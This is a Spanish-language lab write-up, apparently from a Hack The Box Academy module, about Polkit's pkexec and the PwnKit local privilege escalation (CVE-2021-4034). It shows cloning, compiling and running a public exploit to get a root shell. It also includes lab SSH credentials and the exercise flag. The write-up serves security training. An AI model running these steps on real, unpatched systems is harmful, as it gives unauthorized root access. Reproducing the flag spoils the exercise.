
# Polkit Zeroday

PolicyKit ( `polkit`) es un servicio de autorización en sistemas operativos basados ​​en Linux que permite que el software del usuario y los componentes del sistema se comuniquen entre sí, si el software del usuario está autorizado para hacerlo. Para comprobar si el software del usuario está autorizado para esta instrucción, se pregunta a `polkit`. Es posible establecer cómo se otorgan los permisos de forma predeterminada para cada usuario y aplicación.&#x20;

Por ejemplo, para cada usuario, se puede establecer si la operación debe permitirse o prohibirse de forma general, o si se debe requerir autorización como administrador o como un usuario independiente con una validez única, limitada por proceso, limitada por sesión o ilimitada. Para usuarios individuales y grupos, las autorizaciones se pueden asignar individualmente.

Polkit trabaja con dos grupos de archivos.

1. Acciones/políticas (`/usr/share/polkit-1/actions`)
2. Normas (`/usr/share/polkit-1/rules.d`)

Polkit también tiene reglas `local authority` que se pueden usar para establecer o eliminar permisos adicionales para usuarios y grupos. Las reglas personalizadas se pueden colocar en el directorio `/etc/polkit-1/localauthority/50-local.d` con la extensión de archivo `.pkla`.

PolKit también viene con tres programas adicionales:

* `pkexec`- ejecuta un programa con los derechos de otro usuario o con derechos root
* `pkaction`- se puede utilizar para mostrar acciones
* `pkcheck`- esto se puede utilizar para verificar si un proceso está autorizado para una acción específica

La herramienta más interesante para nosotros, en este caso, es `pkexec` porque realiza la misma tarea como `sudo` y puede ejecutar un programa con los derechos de otro usuario o root.

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

En la herramienta `pkexec` se encontró una vulnerabilidad de corrupción de memoria con el identificador [CVE-2021-4034 , también conocida como ](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)[Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) y que también conduce a una escalada de privilegios. Esta vulnerabilidad también estuvo oculta durante más de diez años y nadie puede decir con precisión cuándo fue descubierta y explotada. Finalmente, en noviembre de 2021, esta vulnerabilidad fue publicada y corregida dos meses después.

Para explotar esta vulnerabilidad, necesitamos descargar un [PoC](https://github.com/arthepsy/CVE-2021-4034) y compilarlo en el propio sistema de destino o en una copia que hayamos hecho.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

Una vez compilado el código, podemos ejecutarlo sin más. Tras la ejecución, pasamos del shell estándar (`sh`) a Bash (`bash`) y comprobamos los ID de los usuarios.

```shell-session
cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.205.113 (ACADEMY-LLPE-POLKIT)
Usuario "htb-student"
Contraseña "HTB_@cademy_stdnt!"
```

Aumente los privilegios y envíe el contenido de flag.txt como respuesta.

Al acceder por SSH no nos encontramos ningún archivo relevante ni tiene permisos de ejecución en la máquina:

```shell-session
htb-student@ubuntu:~$ ls
htb-student@ubuntu:~$ sudo -l
[sudo] password for htb-student: 
Sorry, user htb-student may not run sudo on ubuntu.
```

Tal y cómo hemos visto en la sección podríamos usar pkexec para ejecutar comandos en nombre de un usuario administrador, pero necesitamos la contraseña:

```shell-session
htb-student@ubuntu:~$ pkexec -u root id
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/usr/bin/id' as the super user
Authenticating as: lab_adm
Password: 
polkit-agent-helper-1: pam_authenticate failed: Authentication failure
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized

This incident has been reported.
```

Encontramos que el usuario administrador es lab\_adm. Vamos a usar el exploit para el CVE-2021-4034 que hemos visto en esta sección:

<figure><img src="/files/VyLMAHxPwtyKV7epxpGQ" alt=""><figcaption></figcaption></figure>

1. Nos descargamos el repo en local
2. Abrimos un servidor con python
3. Nos descargamos el archivo en la máquina objetivo
4. Compilamos el ejecutable
5. Ejecutamos el PoC
6. Tenemos una shell como root!

```shell-session
# cd /root
# ls
flag.txt  snap

# cat flag.txt
HTB{p0Lk1Tt3n}
```
